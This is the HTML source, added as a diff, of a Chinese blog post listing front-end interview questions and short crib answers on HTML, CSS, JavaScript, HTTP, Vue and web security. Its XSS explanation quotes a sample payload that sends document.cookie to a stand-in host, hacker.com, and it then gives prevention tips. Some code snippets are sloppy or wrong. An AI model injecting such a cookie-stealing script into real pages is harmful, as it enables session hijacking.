@@ -1,0 +1,1314 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="面试题, 前端,学习,技术,互联网">
+    <meta name="description" content="套路
+举例将不会的变成会的侃侃而谈#HTML 押题
+###一、（必考） 你是如何理解 HTML 语义化的？
+
+第一种举例，段落用 p，边栏用 aside，主要内容用 main 标签
+第二种最开始是 PHP 后端写 HTML，不会 CSS，于">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>面试题 | Casper</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Casper</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Casper</div>
+        <div class="logo-desc">
+            
+            前端学习博客，前端工作记录
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/badManPro" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/badManPro" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">面试题</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2018-05-02
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+				
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>套路</p>
+<p>举例<br>将不会的变成会的<br>侃侃而谈<br>#HTML 押题</p>
+<p>###一、（必考） 你是如何理解 HTML 语义化的？</p>
+<ol>
+<li>第一种举例，段落用 p，边栏用 aside，主要内容用 main 标签</li>
+<li>第二种<br>最开始是 PHP 后端写 HTML，不会 CSS，于是就用 table 来布局。table 使用展示表格的。严重违反了 HTML 语义化。<br>后来有了专门的写 CSS 的前端，他们会使用 DIV + CSS 布局，主要是用 float 和绝对定位布局。稍微符合了 HTML 语义化。<br>再后来，前端专业化，知道 HTML 的各个标签的用法，于是会使用恰当的标签来展示内容，而不是傻傻的全用 div，会尽量使用 h1、ul、p、main、header 等标签<br>语义化的好处是已读、有利于SEO等。</li>
+</ol>
+<p>###二、meta viewport 是做什么用的，怎么写？</p>
+<ol>
+<li>死背： <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"><br>控制页面在移动端不要缩小显示。</li>
+<li>侃侃而谈<br><br>一开始，所有页面都是给PC准备的，乔布斯推出 iPhone 3GS，页面是不适应手机屏幕的，所以乔布斯的工程师想了一个办法，默认把手机模拟成 980px，页面缩小。<br>后来，智能手机普及，这个功能在部分网站不需要了，所以我们就用 meta:vp 让手机不要缩小我的网页。</li>
+</ol>
+<p>###三、canvas 元素是干什么的？<br>项目丢给他。<br>看 MDN 的 canvas 入门手册。</p>
+<p>#CSS 押题</p>
+<p>###一、（必考） 说说盒模型。</p>
+<p>举例：<br>content-box: width == 内容区宽度<br>border-box: width == 内容区宽度 + padding 宽度 + border 宽度</p>
+<p>###二、css reset 和 normalize.css 有什么区别？</p>
+<p>考英文：</p>
+<ol>
+<li>reset 重置，之前的样式我不要，a{color: red;}，抛弃默认样式</li>
+<li>normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一。</li>
+</ol>
+<p>###三、（必考）如何居中？<br>平时总结：</p>
+<ol>
+<li>水平居中：<br> 内联：爸爸身上写 text-align:center;<br> 块级：margin-left: auto; margin-right: auto;</li>
+<li>垂直居中： <a href="https://jscode.me/t/topic/1936" target="_blank" rel="noopener">https://jscode.me/t/topic/1936</a></li>
+</ol>
+<p>###四、选择器优先级如何确定？</p>
+<ol>
+<li>选择器越具体，优先级越高。 #xxx 大于 .yyy</li>
+<li>同样优先级，写在后面的覆盖前面的。</li>
+<li>color: red !important; 优先级最高。</li>
+</ol>
+<p>###五、BFC 是什么？<br>举例：</p>
+<ol>
+<li>overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动）</li>
+<li>overflow:hidden 取消父子 margin 合并。<a href="http://jsbin.com/conulod/1/edit?html,css,js,output" target="_blank" rel="noopener">http://jsbin.com/conulod/1/edit?html,css,js,output</a> （方方用 padding-top: 1px;）</li>
+</ol>
+<p>###六、如何清除浮动？</p>
+<ol>
+<li>overflow: hidden （方方反对）</li>
+<li>.clearfix 清除浮动写在爸爸身上</li>
+</ol>
+<pre><code> .clearfix::after{
+     content: '';
+     display: block;
+     clear:both;
+ }
+ .clearfix{
+     zoom: 1; /* IE 兼容 */
+ }</code></pre><p>#JS 押题</p>
+<p>###一、JS 有哪些数据类型？<br>string number bool undefined null object symbol<br>object 包括了数组、函数、正则、日期等对象<br>一旦出现（数组、函数、正则、日期、NaN）直接0分</p>
+<p>###二、（必考） Promise 怎么使用？</p>
+<p>####then</p>
+<pre><code>  $.ajax(...).then(成功函数, 失败函数)</code></pre><p>####链式 then</p>
+<pre><code>  $.ajax(...).then(成功函数, 失败函数).then(成功函数2, 失败函数2)</code></pre><p>####如何自己生成 Promise 对象</p>
+<pre><code>  function xxx(){
+      return new Promise(function(resolve, reject){
+          setTimeout(()=&gt;{
+              resolve() 或者 reject()
+          },3000)
+      })
+  }
+  xxx().then(...)</code></pre><p>###三、（必考） AJAX 手写一下？</p>
+<pre><code> let xhr = new XMLHttpRequest()
+ xhr.open('POST', '/xxxx')
+ xhr.onreadystatechange = function(){
+     if(xhr.readyState === 4 &amp;&amp; xhr.status === 200){
+         console.log(xhr.responseText)
+     }
+ }
+ xhr.send('a=1&amp;b=2(http请求的第四部分)')</code></pre><p>###四、（必考）闭包是什么？</p>
+<pre><code> function (){
+     var n = 0
+     return function(){
+         n += 1
+     }
+ }
+
+ let  adder = ()
+ adder() // n === 1
+ adder() // n === 2
+ console.log(n) // n is not defined</code></pre><p>正确参考：<a href="https://zhuanlan.zhihu.com/p/22486908" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22486908</a></p>
+<p>###五、（必考）这段代码里的 this 是什么？</p>
+<ol>
+<li>fn() 里面的 this 就是 window<br></li>
+<li>fn() 是 strict mode，this 就是 undefined</li>
+<li>a.b.c.fn() 里面的 this 就是 a.b.c</li>
+<li>new F() 里面的 this 就是新生成的实例</li>
+<li>() =&gt; console.log(this) 里面 this 跟外面的 this 的值一模一样<br>正确参考：<a href="https://zhuanlan.zhihu.com/p/23804247" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/23804247</a></li>
+</ol>
+<p>###六、（必考）什么是立即执行函数？使用立即执行函数的目的是什么？</p>
+<pre><code> ;(function (){
+     var name
+ }())
+ ;(function (){
+     var name
+ })()
+ !!!!!!!function (){
+     var name
+ }()
+ ~function (){
+     var name
+ }()</code></pre><p>造出一个函数作用域，防止污染全局变量</p>
+<p>ES 6 新语法</p>
+<p> {<br>     let  name<br> }</p>
+<p>###七、async/await 语法了解吗？目的是什么？</p>
+<pre><code> function returnPromise(){
+     return new Promise(function(resolve, reject){
+         setTimeout(()=&gt;{
+             resolve('fuck')
+         },3000)
+     })
+ }
+
+ returnPromise().then((result)=&gt;{
+     result === 'fuck'
+ })
+
+ var result = await returnPromise()
+ result === 'fuck'</code></pre><p>把异步代码写成同步代码。</p>
+<p>###八、如何实现深拷贝？</p>
+<ol>
+<li>JSON 来深拷贝</li>
+</ol>
+<pre><code>// 将对象变成字符串
+ var a = {...}
+ //    用字符串生成对象
+ var b = JSON.parse(JSON.stringify(a) )
+</code></pre><p>#####缺点：JSON 不支持函数、引用、undefined、RegExp、Date……</p>
+<ol start="2">
+<li>递归拷贝</li>
+</ol>
+<pre><code> function clone(object){
+     var object2
+     if(! (object instanceof Object) ){
+         return object
+     }else if(object instanceof Array){
+         object2 = []
+     }else if(object instanceof Function){
+         object2 = eval(object.toString())
+     }else if(object instanceof Object){
+         object2 = {}
+     }    
+     你也可以把 Array Function Object 都当做 Object 来看待，参考 https://juejin.im/post/587dab348d6d810058d87a0a
+     for(let key in object){
+         object2[key] = clone(object[key])
+     }
+     return object2
+ }</code></pre><ol start="3">
+<li>环</li>
+<li>RegExp、Date、Set、Symbol、WeakMap</li>
+</ol>
+<p>###九、如何实现数组去重？</p>
+<ol>
+<li>计数排序的逻辑（只能正整数）</li>
+</ol>
+<pre><code> var a = [4,2,5,6,3,4,5]
+ var hashTab = {}
+ for(let i=0; i&lt;a.length;i++){
+     if(a[i] in hashTab){
+         // 什么也不做
+     }else{
+         hashTab[ a[i] ] = true
+     }
+ }
+ //hashTab: {4: true, 2: true, 5: true, 6:true, 3: true}
+ console.log(Object.keys(hashTab)) // ['4','2','5','6','3']</code></pre><ol start="2">
+<li>Set 去重</li>
+</ol>
+<pre><code> Array.from(new Set(a))</code></pre><ol start="3">
+<li>WeakMap 任意类型去重</li>
+</ol>
+<p>###十、如何用正则实现 string.trim() ？</p>
+<pre><code> function trim(string){
+     return string.replace(/^\s+|\s+$/g, '')
+ }</code></pre><p>###十一、JS 原型是什么？<br>举例<br>var a = [1,2,3]<br>只有0、1、2、length 4 个key<br>为什么可以 a.push(4) ，push 是哪来的？<br>a.proto === Array.prototype<br>push 就是沿着 a.proto 找到的，也就是 Array.prototype.push<br>Array.prototype 还有很多方法，如 join、pop、slice、splice<br>Array.prototype 就是 a 的原型（proto）<br>参考：<a href="https://zhuanlan.zhihu.com/p/23090041" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/23090041</a><br>ES 6 中的 class 了解吗？<br>把 MDN class 章节看完<br>记住一个例子<br>JS 如何实现继承？</p>
+<p>原型链</p>
+<p>  function Animal(){<br>      this.body = ‘肉体’<br>  }<br>  Animal.prototype.move = function(){</p>
+<p>  }</p>
+<p>  function Human(name){<br>      Animal.apply(this, arguments)<br>      this.name = name<br>  }<br>  // Human.prototype.<strong>proto</strong> = Animal.prototype // 非法</p>
+<p>  var f = function(){}<br>  f.prototype = Animal.prototype<br>  Human.prototype = new f()</p>
+<p>  Human.prototype.useTools = function(){}</p>
+<p>  var frank = new Human()<br>extends 关键字<br>  class Animal{<br>      constructor(){<br>          this.body = ‘肉体’<br>      },<br>      move(){}<br>  }<br>  class Human extends Animal{<br>      constructor(name){<br>          super()<br>          this.name = name<br>      },<br>      useTools(){}<br>  }<br>  var frank = new Human()<br>== 相关题目直接反着答（放弃）</p>
+<p>DOM 押题</p>
+<p>DOM 事件模型是什么？<br>冒泡<br>捕获<br>如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，顺序是由监听顺序决定的。<br>移动端的触摸事件了解吗？<br>touchstart touchmove touchend touchcancel<br>模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。<br>事件委托是什么？有什么好处？</p>
+<p>假设父元素有4个儿子，我不监听4个儿子，而是监听父元素，看触发事件的元素是哪个儿子，这就是事件委托。<br>可以监听还没有出生的儿子（动态生成的元素）。省监听器。</p>
+<p>function listen(element, eventType, selector, fn){<br> element.addEventListener(eventType, e=&gt;{<br>     if(e.target.matches(selector)){<br>         fn.call(el, e, el)<br>     }<br> })<br>}// 有 bug 但是可以应付面试官的事件委托<br>function listen(element, eventType, selector, fn) {<br> element.addEventListener(eventType, e =&gt; {<br>     let el = e.target<br>     while (!el.matches(selector)) {<br>         if (element === el) {<br>             el = null<br>             break<br>         }<br>         el = el.parentNode<br>     }<br>     el &amp;&amp; fn.call(el, e, el)<br> })<br> return element<br>} // 工资 12k+ 的前端写的事件委托<br>listen(ul, ‘click’, ‘li’, ()=&gt;{})</p>
+<p>ul&gt;li*5&gt;span<br>HTTP 押题</p>
+<p>HTTP 状态码知道哪些？<br>301 和 302 的区别是什么？<br>301 永久重定向，浏览器会记住<br>302 临时重定向<br>HTTP 缓存怎么做？<br>Cache-Control: max-age=300<br><a href="http://cdn.com/1.js?v=1" target="_blank" rel="noopener">http://cdn.com/1.js?v=1</a> 避开缓存<br>Cache-Control 和 Etag 的区别是什么？<br>Cookie 是什么？Session 是什么？<br>Cookie<br>HTTP响应通过 Set-Cookie 设置 Cookie<br>浏览器访问指定域名是必须带上 Cookie 作为 Request Header<br>Cookie 一般用来记录用户信息<br>Session<br>Session 是服务器端的内存（数据）<br>Session 一般通过在 Cookie 里记录 SessionID 实现<br>SessionID 一般是随机数<br>LocalStorage 和 Cookie 的区别是什么？<br>Cookie 会随请求被发到服务器上，而 LocalStorage 不会<br>Cookie 大小一般4k以下，LocalStorage 一般5Mb 左右<br>（必考）GET 和 POST 的区别是什么？<br>参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。<br>安全（扯淡）。GET 没有 POST 安全（都不安全）<br>GET 的参数（url查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）<br>包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）<br>GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）<br>（必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？<br>JSONP<br>CORS<br>postMessage 看一下 MDN<br>Vue 押题</p>
+<p>（必考）Vue 有哪些生命周期钩子函数？</p>
+<p>看文档：<a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90" target="_blank" rel="noopener">https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90</a><br>（必考）Vue 如何实现组件通信？</p>
+<p>父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）<br>爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）<br>兄弟通信（new Vue() 作为 eventBus）<br>Vuex 的作用是什么？<br>看文档、博客 <a href="https://vuex.vuejs.org/zh-cn/intro.html" target="_blank" rel="noopener">https://vuex.vuejs.org/zh-cn/intro.html</a><br>VueRouter 路由是什么？<br>看文档、博客<br>Vue 的双向绑定是如何实现的？有什么缺点？<br>看文档，深入响应式原理<br>Computed 计算属性的用法？跟 Methods 的区别。<br><a href="https://zhuanlan.zhihu.com/p/33778594" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33778594</a><br>算法押题</p>
+<p>排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）<br>二分查找法<br>翻转二叉树<br>把上面三个背一下，算法题必过。</p>
+<p>安全押题</p>
+<p>什么是 XSS 攻击？如何预防？<br>举例<br>  div.innerHTML = userComment  // userComment 内容是 <script>$.get('<a href="http://hacker.com?cookie=&#39;+document.cookie" target="_blank" rel="noopener">http://hacker.com?cookie=&#39;+document.cookie</a>)</script><br>  // 恶意就被执行了，这就是 XSS<br>预防<br>不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行<br>如果你一样要用 innerHTML，字符过滤<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ‘ 替换成 '<br>把 ‘ 替换成 "<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…<br>使用 CSP Content Security Policy<br>什么是 CSRF 攻击？如何预防？<br>过程<br>用户在 qq.com 登录<br>用户切换到 hacker.com（恶意网站）<br>hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。<br>用户在不知不觉中添加 hacker 为好友。<br>用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。<br>避免<br>检查 referer，qq.com 可以拒绝来自 hacker.com 的请求<br>csrf_token 来解决<br>Webpack 题</p>
+<p>转译出的文件过大怎么办？<br>使用 code split<br>写法 import(‘xxx’).then(xxx=&gt;{console.log(xxx)})<br>xxx 模块就是按需加载的<br>转译速度慢什么办？<br>方方不会。<br>写过 webpack loader 吗？<br><a href="http://www.alloyteam.com/2016/01/webpack-loader-1/" target="_blank" rel="noopener">http://www.alloyteam.com/2016/01/webpack-loader-1/</a><br>发散题</p>
+<p>从输入 URL 到页面展现中间发生了什么？<br>DNS 查询 DNS 缓存<br>建立 TCP 连接（三次握手）连接复用<br>发送 HTTP 请求（请求的四部分）<br>后台处理请求<br>监听 80 端口<br>路由<br>渲染 HTML 模板<br>生成响应<br>发送 HTTP 响应<br>关闭 TCP 连接（四次挥手）<br>解析 HTML<br>下载 CSS（缓存<br>解析 CSS<br>下载 JS（缓存<br>解析 JS<br>下载图片<br>解析图片<br>渲染 DOM 树<br>渲染样式树<br>执行 JS<br>你没有工作经历吗？</p>
+<p>一开始就问，可以拜拜。<br>中间问最后问，他想压价。<br>解法：用项目打动它：你看下我的作品，跟一年经验的前端差距大吗？你们团队一年工作经验的前端，写的出来我这样的作品吗？凭我的作品，我觉得我可以胜任贵司的工作。<br>你遇到过最难的问题是什么？<br><a href="https://www.zhihu.com/question/35323603/answer/338796153" target="_blank" rel="noopener">https://www.zhihu.com/question/35323603/answer/338796153</a></p>
+<p>你的期望薪资是多少？<br>你想要的工资 加 1000~2000。<br>（任何你不会的问题）<br>承认不会<br>询问详细细节：你问的是不是XXX方面的知识？请问你想问的是哪方面知识？<br>根据面试官的回答，向有利于自己的方向引导话题。<br>刁钻代码题</p>
+<p>map加parseInt</p>
+<p> [1,2,3].map(parseInt)</p>
+<p> parseInt(1,0, array) // 1<br> parseInt(2,1, array) // NaN<br> parseInt(3,2, array) // NaN<br>a.x = a = {}<br> var a = {n:1};<br> var b = a;<br> a.x = a = {n:2};<br>问 a.x 是多少？<br>(a ==1 &amp;&amp; a== 2 &amp;&amp; a==3) 可能为 true 吗？<br>a = {<br>  value: 0,<br>  toString(){<br>    a.value += 1<br>    return a.value<br>  }<br>}</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://badmanpro.github.io" rel="external nofollow noreferrer">Casper Han</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://badmanpro.github.io/2018/05/02/mian-shi-ti/">https://badmanpro.github.io/2018/05/02/mian-shi-ti/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://badmanpro.github.io" target="_blank">Casper Han</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
